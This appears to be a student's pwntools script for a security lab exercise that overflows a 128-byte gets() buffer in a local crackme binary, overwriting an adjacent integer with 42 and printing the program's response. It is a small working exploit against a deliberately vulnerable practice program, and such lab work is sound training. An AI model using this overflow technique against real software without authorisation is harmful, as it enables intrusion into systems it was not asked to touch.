#!/usr/bin/env python3
from pwn import *
import shutil, os, sys

path = '/home/kali/Desktop/svt/Lab03/lab03_material/bof'
BINARY = os.path.join(path, 'crackme1')

STDBUF = shutil.which('stdbuf') or '/usr/bin/stdbuf'

# Load binary metadata (optional but convenient)
elf = ELF(BINARY)
context.binary = elf           # sets arch/endianness automatically
context.log_level = 'info'     # change to 'debug' for verbose pwntools output

def make_payload():
    # buffer is 128 bytes. We want to overwrite the next 4 bytes (int response) with 42.
    # So send 128 filler bytes then a 4-byte little-endian 42.
    offset = 128
    filler = b'A' * offset

    payload = filler + (42).to_bytes(4,'little')

    # gets() will append a terminating null byte after the supplied bytes;
    # that trailing null will sit after the written integer and won't stop us setting the int to 42.
    print(payload)
    return payload

def main():
    # run local process
    io = process(BINARY)
    # launch via stdbuf so stdout is line-buffered even though it's a pipe
    #io = process([STDBUF, '-oL', BINARY])
    #io = gdb.debug(BINARY)
    

    #io.interactive()
    # read prompt until it asks (program prints "Please insert a string: ")
    #io.recv()
    #io.recvline()
    g = io.recvuntil(b'Please insert a string: ', timeout=1)
    print(g.decode())

    payload = make_payload()
    log.info(f"Sending payload of length {len(payload)}")
    io.sendline(payload)

    # read remainder of program output
    out = io.recvall(timeout=1)
    print(out.decode())

if __name__ == '__main__':
    main()
